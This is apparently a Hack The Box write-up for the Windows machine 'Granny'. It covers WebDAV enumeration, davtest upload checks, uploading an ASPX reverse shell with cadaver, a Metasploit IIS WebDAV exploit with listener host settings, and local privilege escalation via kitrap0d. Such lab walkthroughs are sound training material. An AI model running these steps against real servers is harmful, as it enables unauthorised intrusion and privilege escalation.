Box: Windows
Level: Easy
### Index
1. WebDAV Exploitation 
2. Cadaver - WebDav client for Linux
3. davtest - Command line utility to check if you're allowed to upload file using PUT/Move Method. Uploads random files 
4. local_exploit_Suggester.


Following HTTP Methods were supported
```
http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
```

The IIS Server has the WebDev enabled as per nmap 
```
http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
```

Now Here are couple of lessons that I have learned. Running local_exploit_suggester gives me couple of exploits that might work however, none of them were worked. I tried winPEAS.bat and didn't find a proper path to privilege escalation. During the nmap enumeration, I found the following thing enabled on the box.

```
_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path
```

WebDAV was ENABLED. I used the following two tools to check whether I am allowed to upload on the target.
```
$ davtest -move -sendbd auto -url http://granny.htb/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://granny.htb
********************************************************
NOTE    Random string for this session: f4my2eP
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://granny.htb/DavTestDir_f4my2eP
********************************************************
 Sending test files (MOVE method)
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_f4my2eP/davtest_f4my2eP_jsp.txt
MOVE    jsp     SUCCEED:        http://granny.htb/DavTestDir_f4my2eP/davtest_f4my2eP.jsp
MOVE    jsp     SUCCEED:        http://granny.htb/DavTestDir_f4my2eP/davtest_f4my2eP.jsp;.txt
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_f4my2eP/davtest_f4my2eP_html.txt
MOVE    html    SUCCEED:        http://granny.htb/DavTestDir_f4my2eP/davtest_f4my2eP.html
^C
```

Following to this, I used the 'cadaver'  which is a command line WebDav client for Linux to put the Shell.aspx 
```
cadaver http://granny.htb/
dav:/DavTestDir_f4my2eP/> put shell2.aspx 
Uploading shell2.aspx to `/DavTestDir_f4my2eP/shell2.aspx':
Progress: [=============================>] 100.0% of 3015 bytes failed:
```

I got the reverse shell by visiting the http://granny.htb/DavTestDir_f4my2eP/shell2.aspx. NetCat Listener was started. Now I did the same thing with msfconsole. 
```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOST 10.10.10.15
set LHOST 10.10.16.5
exploit

meterpreter>shell
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

From here, I had to reset this machine 3 times to use the local_exploit_suggester. I got the following suggestion from the local exploit suggester.
```
1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

Out of which I used exploit/windows/local/ms10_015_kitrap0d to get the system shell.

